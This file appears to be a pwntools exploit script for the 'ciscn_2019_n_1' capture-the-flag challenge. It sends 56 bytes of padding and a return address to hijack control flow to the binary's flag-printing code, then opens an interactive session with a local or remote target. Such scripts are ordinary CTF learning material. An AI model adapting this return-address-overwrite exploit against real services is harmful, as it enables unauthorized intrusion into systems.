#!/usr/bin/python
#__author__:TaQini

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

local_file  = './ciscn_2019_n_1'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    host, port = sys.argv[1].split(":")
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
	gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400793 # pop rdi ; ret

# elf, libc
len = 56
flag = 0x004006BE
# rop1
payload = 'A'*len
payload += p64(flag)

p.recvuntil("Let's guess the number.\n")
# debug()
p.sendline(payload)

# gdb.attach(p)
# log.info('')
# log.warning('--------------')

p.interactive()

